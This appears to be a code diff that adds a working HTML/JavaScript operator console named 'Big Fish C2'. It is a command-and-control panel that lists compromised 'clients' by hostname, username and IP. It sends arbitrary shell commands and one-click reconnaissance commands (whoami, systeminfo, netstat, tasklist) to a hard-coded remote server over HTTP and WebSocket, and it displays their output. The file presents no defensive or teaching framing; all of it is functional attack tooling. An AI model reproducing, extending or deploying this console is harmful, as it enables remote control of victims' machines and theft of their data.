@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Big Fish C2 - Stable Console</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #1a1a1a;
+            color: #e0e0e0;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00b4db;
+        }
+        
+        .status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4CAF50;
+            animation: pulse 2s infinite;
+        }
+        
+        .status-dot.offline {
+            background: #f44336;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .stats {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .stat {
+            background: #333;
+            padding: 8px 15px;
+            border-radius: 5px;
+        }
+        
+        .stat-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #00b4db;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        
+        .main-content {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .sidebar {
+            width: 300px;
+        }
+        
+        .panel {
+            background: #2a2a2a;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .panel-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #00b4db;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+        
+        .clients-list {
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .client-item {
+            background: #333;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .client-item:hover {
+            background: #3a3a3a;
+        }
+        
+        .client-item.active {
+            background: #006680;
+        }
+        
+        .client-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        
+        .client-name {
+            font-weight: bold;
+        }
+        
+        .client-status {
+            font-size: 12px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            background: #4CAF50;
+        }
+        
+        .client-status.offline {
+            background: #666;
+        }
+        
+        .client-status.idle {
+            background: #ff9800;
+        }
+        
+        .client-info {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .content-area {
+            flex: 1;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 15px;
+        }
+        
+        .tab {
+            padding: 8px 16px;
+            background: #333;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        
+        .tab.active {
+            background: #00b4db;
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .console {
+            background: #000;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.4;
+            height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .command-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .command-input input {
+            flex: 1;
+            padding: 10px;
+            background: #333;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: white;
+            font-family: 'Consolas', monospace;
+        }
+        
+        .command-input button {
+            padding: 10px 20px;
+            background: #00b4db;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+        }
+        
+        .quick-commands {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 15px;
+        }
+        
+        .quick-cmd {
+            padding: 8px;
+            background: #333;
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .quick-cmd:hover {
+            background: #3a3a3a;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            transform: translateX(150%);
+            transition: transform 0.3s;
+            z-index: 1000;
+        }
+        
+        .toast.show {
+            transform: translateX(0);
+        }
+        
+        .toast.error {
+            background: #f44336;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #2a2a2a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00b4db;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="title">Big Fish C2 - Stable Console</div>
+            <div class="status">
+                <div class="status-dot" id="statusDot"></div>
+                <span id="serverStatus">Connecting...</span>
+            </div>
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="onlineCount">0</div>
+                    <div class="stat-label">Online</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="totalClients">0</div>
+                    <div class="stat-label">Total</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="main-content">
+            <div class="sidebar">
+                <div class="panel">
+                    <div class="panel-title">Connected Clients</div>
+                    <div class="clients-list" id="clientsList">
+                        Loading...
+                    </div>
+                </div>
+                
+                <div class="panel">
+                    <div class="panel-title">Quick Commands</div>
+                    <div class="quick-commands">
+                        <div class="quick-cmd" onclick="sendQuickCommand('whoami')">Whoami</div>
+                        <div class="quick-cmd" onclick="sendQuickCommand('ipconfig')">IP Config</div>
+                        <div class="quick-cmd" onclick="sendQuickCommand('dir')">List Files</div>
+                        <div class="quick-cmd" onclick="sendQuickCommand('systeminfo')">System Info</div>
+                        <div class="quick-cmd" onclick="sendQuickCommand('netstat -an')">Netstat</div>
+                        <div class="quick-cmd" onclick="sendQuickCommand('tasklist')">Processes</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="content-area">
+                <div class="panel">
+                    <div class="tabs">
+                        <div class="tab active" onclick="switchTab('console')">Console</div>
+                        <div class="tab" onclick="switchTab('info')">Info</div>
+                    </div>
+                    
+                    <div id="consoleTab" class="tab-content active">
+                        <div class="console" id="consoleOutput">
+                            Select a client to start...
+                        </div>
+                        <div class="command-input">
+                            <input type="text" id="commandInput" placeholder="Enter command..." onkeypress="handleKeyPress(event)">
+                            <button onclick="sendCommand()">Send</button>
+                        </div>
+                    </div>
+                    
+                    <div id="infoTab" class="tab-content">
+                        <div id="clientInfo">
+                            Select a client to view info...
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast" id="toast"></div>
+    
+    <script>
+        const SERVER_URL = 'https://c2-server-zz0i.onrender.com';
+        let socket = null;
+        let selectedClient = null;
+        let clients = [];
+        
+        function initWebSocket() {
+            try {
+                socket = new WebSocket(`ws://c2-server-zz0i.onrender.com/socket.io/?EIO=4&transport=websocket`);
+                
+                socket.onopen = () => {
+                    showToast('Connected to server');
+                    updateStatus(true);
+                    loadClients();
+                };
+                
+                socket.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data.replace(/^\d+/, ''));
+                        handleSocketMessage(data);
+                    } catch (e) {
+                        // Raw socket message
+                    }
+                };
+                
+                socket.onerror = (error) => {
+                    console.error('Socket error:', error);
+                    updateStatus(false);
+                };
+                
+                socket.onclose = () => {
+                    showToast('Disconnected', true);
+                    updateStatus(false);
+                    setTimeout(initWebSocket, 3000);
+                };
+                
+            } catch (e) {
+                console.error('WebSocket init error:', e);
+                setTimeout(initWebSocket, 3000);
+            }
+        }
+        
+        function handleSocketMessage(data) {
+            if (data.type === 'heartbeat') {
+                // Keep connection alive
+            } else if (data.type === 'command_result') {
+                if (selectedClient && data.client_id === selectedClient.id) {
+                    appendToConsole(`\n[${new Date().toLocaleTimeString()}] ${data.command}\n${data.output}\n`);
+                }
+            } else if (data.type === 'new_command') {
+                showToast('Command sent');
+            } else if (data.type === 'stats_update') {
+                updateStats(data);
+            }
+        }
+        
+        async function loadClients() {
+            try {
+                const response = await fetch(`${SERVER_URL}/api/clients`);
+                const data = await response.json();
+                
+                if (data.clients) {
+                    clients = data.clients;
+                    renderClients();
+                    updateStats();
+                    
+                    if (!selectedClient && clients.length > 0) {
+                        selectClient(clients[0]);
+                    }
+                }
+            } catch (error) {
+                console.error('Load clients error:', error);
+            }
+        }
+        
+        function renderClients() {
+            const container = document.getElementById('clientsList');
+            container.innerHTML = '';
+            
+            if (clients.length === 0) {
+                container.innerHTML = '<div>No clients connected</div>';
+                return;
+            }
+            
+            clients.forEach(client => {
+                const div = document.createElement('div');
+                div.className = `client-item ${selectedClient?.id === client.id ? 'active' : ''}`;
+                div.onclick = () => selectClient(client);
+                
+                div.innerHTML = `
+                    <div class="client-header">
+                        <div class="client-name">${client.hostname}</div>
+                        <div class="client-status ${client.status}">${client.status_icon}</div>
+                    </div>
+                    <div class="client-info">
+                        ${client.username}@${client.ip}<br>
+                        Last: ${client.last_seen_str}
+                    </div>
+                `;
+                
+                container.appendChild(div);
+            });
+        }
+        
+        function selectClient(client) {
+            selectedClient = client;
+            renderClients();
+            document.getElementById('consoleOutput').innerHTML = 
+                `Connected to ${client.hostname} (${client.ip})\nStatus: ${client.status}\n\n`;
+        }
+        
+        async function sendCommand() {
+            const input = document.getElementById('commandInput');
+            const command = input.value.trim();
+            
+            if (!command || !selectedClient) {
+                showToast('Select a client and enter command', true);
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${SERVER_URL}/api/command`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        client_id: selectedClient.id,
+                        command: command
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    appendToConsole(`\n[${new Date().toLocaleTimeString()}] > ${command}\n`);
+                    input.value = '';
+                    showToast('Command sent');
+                } else {
+                    showToast('Failed: ' + data.error, true);
+                }
+            } catch (error) {
+                showToast('Connection error', true);
+            }
+        }
+        
+        function sendQuickCommand(cmd) {
+            if (!selectedClient) {
+                showToast('Select a client first', true);
+                return;
+            }
+            
+            document.getElementById('commandInput').value = cmd;
+            sendCommand();
+        }
+        
+        function appendToConsole(text) {
+            const console = document.getElementById('consoleOutput');
+            console.innerHTML += text;
+            console.scrollTop = console.scrollHeight;
+        }
+        
+        function updateStats(data) {
+            if (data) {
+                document.getElementById('onlineCount').textContent = data.online_count || 0;
+            } else {
+                const online = clients.filter(c => c.status === 'online').length;
+                document.getElementById('onlineCount').textContent = online;
+                document.getElementById('totalClients').textContent = clients.length;
+            }
+        }
+        
+        function updateStatus(connected) {
+            const dot = document.getElementById('statusDot');
+            const status = document.getElementById('serverStatus');
+            
+            if (connected) {
+                dot.className = 'status-dot';
+                status.textContent = 'Connected';
+            } else {
+                dot.className = 'status-dot offline';
+                status.textContent = 'Disconnected';
+            }
+        }
+        
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${isError ? 'error' : ''} show`;
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        
+        function switchTab(tabName) {
+            // Update tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Activate selected tab
+            event.target.classList.add('active');
+            document.getElementById(tabName + 'Tab').classList.add('active');
+        }
+        
+        function handleKeyPress(event) {
+            if (event.key === 'Enter') {
+                sendCommand();
+            }
+        }
+        
+        // Initialize
+        window.onload = function() {
+            initWebSocket();
+            
+            // Auto-refresh clients
+            setInterval(loadClients, 10000);
+            
+            // Update time
+            setInterval(() => {
+                if (selectedClient) {
+                    const now = new Date();
+                    document.title = `Big Fish - ${selectedClient.hostname} (${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')})`;
+                }
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
